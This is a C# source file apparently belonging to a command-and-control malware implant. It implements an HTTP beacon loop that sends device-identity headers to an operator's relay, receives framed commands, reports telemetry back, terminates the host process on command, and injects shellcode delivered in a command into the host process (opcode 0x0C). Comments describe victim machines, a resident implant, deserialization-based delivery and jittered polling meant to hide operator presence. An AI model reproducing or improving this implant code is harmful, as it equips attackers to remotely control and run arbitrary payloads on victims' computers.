using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace CSharpAgent
{
    // The HTTP beacon loop — the SAME wire contract the JScript agent speaks (see the
    // jscript-agent repo's "Beacon contract (v3)", spoken against the HTTP relay's root):
    //
    //   • synchronous POST to H_URL carrying the identity header set (X-Device-Id et al.) on EVERY request
    //     (binary bodies; the JScript agent bridges raw bytes via ADODB.Stream);
    //   • request body = a stream of [u32le length][bytes] frames — every reply owed
    //     since the last POST, empty when none;
    //   • every successful answer is 200 whose body is the same frame stream of the
    //     queued [opcode][payload] commands (batched up to 32 frames / 4 MiB) — an
    //     empty body means nothing is queued: re-POST immediately when the relay HELD
    //     the request (attached C2 — that hold IS the sleep), but an empty answer that
    //     returned FAST means no panel is attached and the loop paces itself locally
    //     (FastEmptyAnswerMs below);
    //   • any non-200 answer or transport failure is FATAL — Run() returns and the
    //     deserialization below us unwinds. No retry loop: presence is re-established by
    //     re-delivery, not by burning CPU against a dead relay.
    internal static class Beacon
    {
        // The relay batches commands up to 32 frames / 4 MiB — anything past these caps is
        // not the relay this agent has a contract with. A hostile endpoint could otherwise
        // stream an endless body into memory (the reader used to go to EOF) or drown the
        // dispatcher in millions of tiny frames. Over-cap reads as a hostile body: the
        // same fatal as a non-200. The thresholds sit deliberately ABOVE the relay's own
        // 32-frame / 4 MiB batch contract (2x / 1.25x headroom) — a near-miss legitimate
        // batch is never executed as hostile; only streams past the contract die here.
        private const long MaxResponseBytes = 5L * 1024 * 1024;
        private const int MaxResponseFrames = 64;

        // The relay holds a poll 25-35 s ONLY while a C2 panel is attached; detached, it
        // answers an IMMEDIATE empty 200 (hub.ts: "if (!this.c2) return emptyBeaconAnswer()").
        // An empty answer that came back faster than any hold could have means nobody is
        // holding — pace ourselves locally instead of free-spinning (audit No.23: measured
        // ~2,200 POST/s on loopback against an unheld relay — victim CPU burn plus a request
        // storm on the worker). 10 s sits safely between "instant" and the 25 s hold floor.
        private const long FastEmptyAnswerMs = 10000;
        // Mirrors the relay's own hold window: the POST cadence stays ~1 per 25-35 s whether
        // or not a panel is watching — the agent's request rate never reveals operator
        // presence, and a jittered sleep is not a metronome.
        private const int IdleSleepMinMs = 25000;
        private const int IdleSleepMaxMs = 35000;
        private static readonly Random _idleJitter = new Random();

        internal static void Run(string beaconUrl)
        {
#if DEBUG
            Diag.Show("[3] Run", "Beacon.Run entered — adding Tls12 onto the OS-default TLS mask (|=, never replace)");
#endif
            // ADD Tls12 to the OS-default protocol mask — never REPLACE it. The Tls12-only
            // assignment bricked stock Win7: its schannel predates TLS 1.2 (unless KB 3140245
            // is installed), so the HTTPS beacon died before the first POST and the 0x0B
            // handover reported a FALSE success. With |= Win10/11 still negotiate 1.2 while
            // Win7 keeps its legacy protocols — the relay edge accepts TLS 1.0 (the JScript
            // agent's own beacons ride it). The int-cast form works on CLR 2.0 where
            // SecurityProtocolType.Tls12 doesn't exist; stacks that reject the value
            // throw — swallowed.
            try
            {
                ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
            }
            catch { }
#if DEBUG
            // [4] — the mask AS THE RUNTIME SEES IT: 48=Ssl3, 192=Tls1.0, 768=Tls11,
            // 3072=Tls12. Stock Win7 + CLR2 reads 3312 (240|3072) after the |=; a value of
            // exactly 3072 here means the |= landed on a SystemDefault-0 stack and REPLACED
            // the OS defaults — the Tls12-only brick again.
            try
            {
                Diag.Show("[4] tls mask", "ServicePointManager.SecurityProtocol = " +
                    ((int)ServicePointManager.SecurityProtocol));
            }
            catch { }
#endif
            // Expect100Continue is scoped to OUR endpoint's ServicePoint inside Post(), not
            // flipped process-globally: the host's own HTTP stack keeps its 100-continue
            // semantics (audit No.29 — a resident implant does not mutate the foreign
            // process's network behavior beyond what its own requests need).

            var headers = Identity.Build();
            _beaconUrl = beaconUrl;
            _headers = headers;
            var uuid = "";
            for (var i = 0; i < headers.Length; i++)
                if (headers[i][0] == "X-Device-Id") uuid = headers[i][1];
            Log("beaconing to " + beaconUrl + " as " + (uuid != "" ? uuid : "an unidentified machine"));
#if DEBUG
            // [5] — if [3] logged and this never does, Identity.Build threw (WMI/registry
            // access on the box) and the TypeInitializationException killed the process.
            // The OMITTED:… note names the header whose raw value carried wire-unsafe
            // bytes — the ArgumentException that used to kill POST #1 before any I/O.
            Diag.Show("[5] identity", "headers built — beaconing as " +
                (uuid != "" ? uuid : "AN UNIDENTIFIED MACHINE (empty X-Device-Id)") +
                (Identity.LastCleaningNote != "" ? " | " + Identity.LastCleaningNote : ""));
#endif

            // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
            // that the relay already delivered to the JScript agent on this machine; the
            // requester waiting on the relay's FIFO expects that command's status on the
            // NEXT request body this session sends. That next request is OUR first POST, so it
            // carries status 0 + corrId 0 (chain completed; id 0 = unmatched — the command went
            // to the JScript agent, not us). Harmless when we were NOT started by an upgrade
            // (the relay drops an unsolicited response body with an empty awaiting FIFO).
            var pending = new List<byte[]> { Reply(0, 0) }; // [status:u32][corrId:u32] — the owed reply
            var post = 0;

            while (true)
            {
                post++;
#if DEBUG
                // [6] only on the FIRST POST — healthy idle iterations stay silent (a line
                // per 25-35 s long-poll would grow the file forever).
                if (post == 1)
                    Diag.Show("[6] POST #1", "sending " + BuildFrames(pending).Length +
                        " bytes — the owed first beacon rides this one");
#endif
                var watch = System.Diagnostics.Stopwatch.StartNew();
                byte[] responseBody;
#if DEBUG
                try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
                catch (Exception ex)
                {
                    Diag.Show("[exit] POST #" + post + " threw",
                        Diag.Describe(ex) +
                        " | no inner chain, died before any bytes hit the wire = request SETUP (a header value — see [5]); " +
                        "SecureChannelFailure = the TLS mask/schannel brick");
                    Log("beacon failed — stopping");
                    return;
                }
#else
                try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
                catch (Exception) { responseBody = null; }
#endif
                var elapsedMs = watch.ElapsedMilliseconds;
                if (responseBody == null)
                {
#if DEBUG
                    Diag.Show("[exit] POST #" + post + " not 200",
                        "answer was not a clean 200 — fatal per the beacon contract (no retry loop)");
#endif
                    Log("beacon failed — stopping");
                    return;
                }
#if DEBUG
                if (post == 1)
                    Diag.Show("[7] POST #1 ok", "got " + responseBody.Length + " bytes back — transport established" +
                        (responseBody.Length == 0 ? "; empty body = nothing queued, entering the silent beacon loop" : ""));
#endif

                pending.Clear();
                var frames = ParseFrames(responseBody);
                if (frames == null)
                {
#if DEBUG
                    Diag.Show("[exit] malformed", "response body is not a valid [u32le len][bytes] frame stream — fatal");
#endif
                    // Same death-notice ship as the non-200 fatal above: a malformed body
                    // was the one fatal path that died silently — the operator saw the
                    // agent vanish with no "beacon failed" line at all.
                    Log("beacon failed — malformed response body");
                    return; // malformed body — fatal, same as a bad status
                }
                if (frames.Count == 0)
                {
                    // Empty AND fast = the detached relay (a held poll returns after 25-35 s).
                    // Sleep the hold locally: same cadence as the attached state, no free-spin.
                    if (elapsedMs < FastEmptyAnswerMs)
                    {
#if DEBUG
                        Diag.Show("[pace] unheld", "empty answer in " + elapsedMs +
                            " ms — no panel attached; sleeping the hold locally");
#endif
                        System.Threading.Thread.Sleep(_idleJitter.Next(IdleSleepMinMs, IdleSleepMaxMs));
                    }
                    continue;
                }
                foreach (var command in frames)
                {
#if DEBUG
                    Diag.Show("[cmd] 0x" + (command.Length > 0 ? command[0].ToString("X2") : "00"),
                        "command frame — " + command.Length + " bytes, corrId " +
                        (command.Length >= 5 ? BitConverter.ToUInt32(command, 1).ToString() : "0"));
#endif
                    var reply = Dispatch(command);
                    if (reply != null) pending.Add(reply); // Exit never returns from Dispatch
                }
            }
        }

        // --- Log fast path (X-Log-Only: 1) ---------------------------------------
        //
        // Same fire-and-forget contract the JScript agent speaks: POST with the full
        // identity header set plus X-Log-Only: 1, body = one frame holding the UTF-8
        // line. The relay answers an EMPTY 200 IMMEDIATELY (no long-poll hold) and
        // broadcasts an agent_log event to the operator's events feed. NEVER fatal — a
        // failed ship is swallowed — and there is no local echo at all (headless host).

        private static string _beaconUrl;
        private static string[][] _headers;

        internal static void Log(string line)
        {
            if (_beaconUrl == null || _headers == null) return; // not beaconing yet — nothing to ship on
            try
            {
                var bytes = Encoding.UTF8.GetBytes(line);
                var body = new byte[4 + bytes.Length];
                BitConverter.GetBytes(bytes.Length).CopyTo(body, 0);
                bytes.CopyTo(body, 4);

                var request = (HttpWebRequest)WebRequest.Create(_beaconUrl);
                request.Method = "POST";
                request.ContentType = "application/octet-stream";
                // The relay answers immediately (no long-poll) — a short ceiling keeps a
                // wedged relay from stalling the beacon loop for a full minute per line.
                request.Timeout = 15000;
                request.ReadWriteTimeout = 15000;
                for (var i = 0; i < _headers.Length; i++)
                    request.Headers.Add(_headers[i][0], _headers[i][1]);
                request.Headers.Add("X-Log-Only", "1");
                request.ContentLength = body.Length;
                using (var stream = request.GetRequestStream())
                    stream.Write(body, 0, body.Length);
                try { request.GetResponse().Close(); }
                catch (WebException) { } // 4xx/5xx from the log path is irrelevant
            }
            catch { }
        }

        // Command dispatch. Commands arrive as [opcode][corrId:u32le][payload...] — the id is
        // echoed in every reply after the status: [status:u32][corrId:u32] (id 0 = unmatched).
        // Exit (0x0A) never returns — it kills the host process (and any
        // agent injected into it: correct "terminate implant" semantics). UpgradeNative (0x0C)
        // is this breed's ONE capability; everything else — the deserialization UpgradeNetFramework
        // included — replies status 2 (unknown for this breed), mirroring how the JScript
        // agent treats every command but its own.
        private static byte[] Dispatch(byte[] command)
        {
            var corrId = command.Length >= 5 ? BitConverter.ToUInt32(command, 1) : 0;
            if (command.Length == 0) return Reply(2, 0);
            if (command[0] == 10)
            {
#if DEBUG
                Diag.Show("[exit] cmd 0x0A", "operator Exit — Environment.Exit(0) kills this process now");
#endif
                Environment.Exit(0);
                return null; // unreachable — Exit never returns
            }
            if (command[0] == 12)
            {
                // Payload after the corrId: [binLen:u32le][PIC binary][ASCII `NAME=value` env
                // lines] (the same env-line style the 0x0B headers use). The PIC bytes RIDE THE
                // COMMAND — the C2 fetched them browser-side and embedded them, so there is no
                // runtime download and no A_URL anywhere; W_URL (the relay the injected
                // WebSocket agent reads from the process env) is the only current env var. We
                // stay resident afterwards: the injected agent runs in THIS process, so
                // exiting would kill it too.
                try
                {
                    var binLen = command.Length >= 9 ? BitConverter.ToInt32(command, 5) : 0;
                    // Widen before comparing: 9 + binLen wraps negative near int.MaxValue and
                    // slips past this guard (the same CWE-190 shape as ParseFrames below) —
                    // contained here only because Dispatch's try catches the failed allocation.
                    if (binLen <= 0 || 9 + (long)binLen > command.Length)
                    {
#if DEBUG
                        Diag.Show("[exit] 0x0C", "bad or missing payload length — replying status 1 (nothing to inject)");
#endif
                        return Reply(1, corrId); // no/short payload ⇒ nothing to inject
                    }
                    var payload = new byte[binLen];
                    Array.Copy(command, 9, payload, 0, binLen);
                    var start = 9 + binLen;
                    while (start < command.Length)
                    {
                        var nl = Array.IndexOf(command, (byte)'\n', start);
                        var end = nl < 0 ? command.Length : nl;
                        // Non-ASCII bytes never ride an env line: ASCII best-fit would
                        // silently map them to '?', and a mangled W_URL makes the PIC
                        // kill the host on arrival (audit No.29). Reject the whole line.
                        var ascii = true;
                        for (var i = start; i < end; i++)
                            if (command[i] >= 0x80) { ascii = false; break; }
                        var line = ascii
                            ? Encoding.ASCII.GetString(command, start, end - start).TrimEnd('\r')
                            : null;
                        var eq = line != null ? line.IndexOf('=') : -1;
                        // W_URL is the ONLY name the wire may set. This channel is a config
                        // pipe for the payload, not an arbitrary-setenv primitive: an
                        // unfiltered NAME lets a hostile relay mutate OUR host — PATH into
                        // children, PROCESSOR_ARCHITECTURE (which the stub selector re-reads
                        // per injection) into a deferred wrong-arch crash, or a W_URL
                        // pre-seed that outlives a refused command (audit No.24).
                        if (eq > 0 && line.Substring(0, eq) == "W_URL")
                            Environment.SetEnvironmentVariable("W_URL", line.Substring(eq + 1),
                                EnvironmentVariableTarget.Process);
                        if (nl < 0) break;
                        start = nl + 1;
                    }
                    // The PIC bails hard — ExitProcess, no retry — when W_URL is missing OR
                    // EMPTY (a literal empty entry can ride a raw CreateProcess environment
                    // block, which GetEnvironmentVariable reports as "" rather than null —
                    // audit No.25): a 0x0C without a usable W_URL is a command that kills
                    // the host on arrival. Refuse to inject and reply status 1 instead.
                    if (string.IsNullOrEmpty(Environment.GetEnvironmentVariable("W_URL")))
                    {
                        Log("0x0C refused — payload carries no W_URL (the PIC would kill the host)");
                        return Reply(1, corrId);
                    }
#if DEBUG
                    Diag.Show("[0x0C] inject", "payload " + payload.Length + " bytes taken from the command — calling ShellcodeRunner.RunPayload");
#endif
                    // Last telemetry before a never-returning entry: on the success path
                    // nothing of ours logs again (the PIC owns the thread from here), so
                    // this line is the operator's injection marker — success then shows up
                    // as the WebSocket agent appearing on the relay.
                    Log("0x0C injecting " + payload.Length + " bytes");
                    ShellcodeRunner.RunPayload(payload);
#if DEBUG
                    Diag.Show("[0x0C] done", "PIC agent injected into this process — staying resident, replying status 0");
#endif
                    return Reply(0, corrId);
                }
#if DEBUG
                catch (Exception ex)
                {
                    Diag.Show("[exit] 0x0C failed", Diag.Describe(ex));
                    return Reply(1, corrId);
                }
#else
                catch (Exception)
                {
                    return Reply(1, corrId);
                }
#endif
            }
            return Reply(2, corrId);
        }

        /// <summary>Build a reply frame: [status:u32le][corrId:u32le].</summary>
        private static byte[] Reply(uint status, uint corrId)
        {
            var frame = new byte[8];
            BitConverter.GetBytes(status).CopyTo(frame, 0);
            BitConverter.GetBytes(corrId).CopyTo(frame, 4);
            return frame;
        }

        // One beacon round trip: POST the v3-bin frame stream, return the raw response
        // body bytes, or null when the answer is anything but a clean 200. Transport-level
        // failures throw to the caller.
        private static byte[] Post(string url, string[][] headers, byte[] body)
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/octet-stream";
            // The contract makes ANY non-200 fatal, but HttpWebRequest silently follows
            // redirects by default — a 302 to a live URL reads as a clean 200 and the
            // fatal never fires (observed live: the agent beaconed on through it).
            request.AllowAutoRedirect = false;
            // Scoped to THIS endpoint's ServicePoint, never to ServicePointManager (that
            // would flip 100-continue off for the whole host process): our binary POSTs
            // don't want the 100-continue round trip, the host's own traffic keeps its.
            try { request.ServicePoint.Expect100Continue = false; }
            catch { }
            // The relay holds each request 25–35 s server-side; keep generous headroom over
            // that window (the JScript agent's receive timeout is 45 s for the same reason).
            request.Timeout = 60000;
            request.ReadWriteTimeout = 60000;
            for (var i = 0; i < headers.Length; i++)
                request.Headers.Add(headers[i][0], headers[i][1]);

            request.ContentLength = body.Length;
            using (var stream = request.GetRequestStream())
                stream.Write(body, 0, body.Length);

            using (var response = (HttpWebResponse)request.GetResponse())
            {
                if (response.StatusCode != HttpStatusCode.OK) return null;
                using (var ms = new MemoryStream())
                {
                    if (!CopyStream(response.GetResponseStream(), ms))
                    {
                        Log("beacon failed — response body over " + MaxResponseBytes + " bytes, treating as hostile");
                        return null;
                    }
                    return ms.ToArray();
                }
            }
        }

        // --- Binary framing ([u32le length][bytes] per frame — see the contract header) ---

        private static byte[] BuildFrames(List<byte[]> frames)
        {
            var total = 0;
            for (var i = 0; i < frames.Count; i++) total += 4 + frames[i].Length;
            var body = new byte[total];
            var offset = 0;
            for (var i = 0; i < frames.Count; i++)
            {
                var frame = frames[i];
                BitConverter.GetBytes(frame.Length).CopyTo(body, offset);
                frame.CopyTo(body, offset + 4);
                offset += 4 + frame.Length;
            }
            return body;
        }

        /// <summary>Parse a v3-bin body into its frames. Null = malformed (caller treats it
        /// as fatal, same as a non-200). An empty body parses to zero frames.</summary>
        private static List<byte[]> ParseFrames(byte[] body)
        {
            var frames = new List<byte[]>();
            var offset = 0;
            while (offset < body.Length)
            {
                if (offset + 4 > body.Length) return null;
                var length = BitConverter.ToInt32(body, offset);
                offset += 4;
                // Long sum: the int addition wraps negative for lengths near int.MaxValue,
                // passing this check; the oversized new byte[length] below then throws
                // OUTSIDE any try and kills the process instead of the contract's clean
                // fatal (proven live: a 4-byte FF FF FF 7F body crashed the agent).
                if (length < 0 || (long)offset + length > body.Length) return null;
                var frame = new byte[length];
                Buffer.BlockCopy(body, offset, frame, 0, length);
                frames.Add(frame);
                if (frames.Count > MaxResponseFrames) return null; // over the batch cap — hostile body
                offset += length;
            }
            return frames;
        }

        /// <summary>Copy the response body into memory; false when it exceeds
        /// MaxResponseBytes (a hostile stream — the caller treats it as fatal).</summary>
        private static bool CopyStream(Stream source, MemoryStream target)
        {
            var buffer = new byte[64 * 1024];
            int read;
            long total = 0;
            while ((read = source.Read(buffer, 0, buffer.Length)) > 0)
            {
                total += read;
                if (total > MaxResponseBytes) return false;
                target.Write(buffer, 0, read);
            }
            return true;
        }

    }
}
